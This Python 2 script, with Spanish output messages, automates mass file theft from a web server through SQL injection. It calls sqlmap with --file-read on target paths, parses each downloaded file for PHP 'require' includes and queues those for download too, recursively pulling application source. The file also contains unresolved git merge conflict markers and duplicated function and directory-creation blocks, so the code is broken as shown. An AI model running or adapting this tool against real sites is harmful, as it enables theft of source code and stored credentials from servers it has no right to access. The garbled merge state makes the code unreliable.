#! /usr/bin/python

import commands
import os
import re
<<<<<<< HEAD
=======
import shutil
>>>>>>> 4b58531487b2a20834c82981a95983ae2c6acec1
import sys



sqlmap_arg = sys.argv[1]
dirw = sys.argv[2]
droot = sys.argv[3]
files = sys.argv[4].split()

def download_file(f):	
	status, ret = commands.getstatusoutput("sqlmap " + sqlmap_arg + " --file-read=" + f + " --batch")
	patron = re.compile("files saved to.*\n\[\*\] (.*) \(size.*")
	filed = patron.findall(ret)
	if len(filed) > 0:	
		p, a = os.path.split(f)
		dest = "output/" + dirw + "/" + a		
		#os.rename(filed[0],dest)
		print("[+] Descargado el archivo " + f + "")
		return dest

#########################################################################################################

<<<<<<< HEAD
print("[*] Iniciando descarga")
		
if os.path.isdir("output"):
	print ("[+] Directorio output creado")
else:
	os.makedirs("output")
	print ("[+] Directorio output creado")
=======
def download_file(f):	
	status, ret = commands.getstatusoutput("sqlmap " + sqlmap_arg + " --file-read=" + f + " --batch")
	patron = re.compile("files saved to.*\n\[\*\] (.*) \(size.*")
	filed = patron.findall(ret)
	if len(filed) > 0:
		print(filed[0])
		shutil.move(filed[0],"output/" + f)

		
if os.path.isdir("output"):
	print ("directorio output creado")
else:
	os.makedirs("output")
	print ("directorio output creado")

os.chdir("output")

>>>>>>> 4b58531487b2a20834c82981a95983ae2c6acec1

os.chdir("output")

if os.path.isdir(dirw):
	print ("[+] Directorio " + dirw + " creado")
else:
	os.makedirs(dirw)
	print ("[+] Directorio " + dirw + " creado")

os.chdir("..")

while (files):
	nf = download_file(files.pop())
	if nf:
		try:
			fo = open(nf,"r")
			fc = fo.read()
			fo.close()
		except IOError:
			fc = ""
			print ("[*] Error: no se puede abrir el archivo: " + nf)

		patron = re.compile("require.*['\"](.*?)[\"']")
		fs = patron.findall(fc)
		for i in fs:
			files.append(droot + i)
			print("[-] Agregado " + droot + i + " a la cola...")		

print "[*] Descarga masiva finalizada en " + dirw

